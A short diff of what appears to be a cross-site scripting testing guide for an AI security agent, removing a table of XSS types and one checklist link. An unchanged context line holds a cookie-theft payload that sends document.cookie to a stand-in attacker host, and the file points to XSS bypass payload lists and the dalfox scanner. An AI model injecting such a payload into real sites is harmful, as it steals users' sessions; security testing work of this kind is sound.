@@ -20,12 +20,6 @@ origin: AI Threat Hunting
 
 ## Types
 
-| Type | Persistence |
-|------|-------------|
-| Reflected | None — requires victim click |
-| Stored | Persistent — triggers on page view |
-| DOM-based | Client-side JS processes input unsafely |
-
 ## Automated Scanning with dalfox
 
 Run dalfox first for broad detection, then manually validate and escalate confirmed hits:
@@ -153,5 +147,4 @@ new Image().src='https://attacker.example/steal?c='+document.cookie  // Session 
 ## Extended Resources
 
 - `agent/references/payloads/xss-payloads.md` — DOM XSS, reflected, stored, filter bypass, CSP bypass, polyglots
-- `agent/references/vuln-checklists/A05-injection.md` — OWASP Top 10:2025 injection checklist
 - `agent/references/tools/exploitation/dalfox.md` — dalfox flags, pipe mode, blind XSS setup
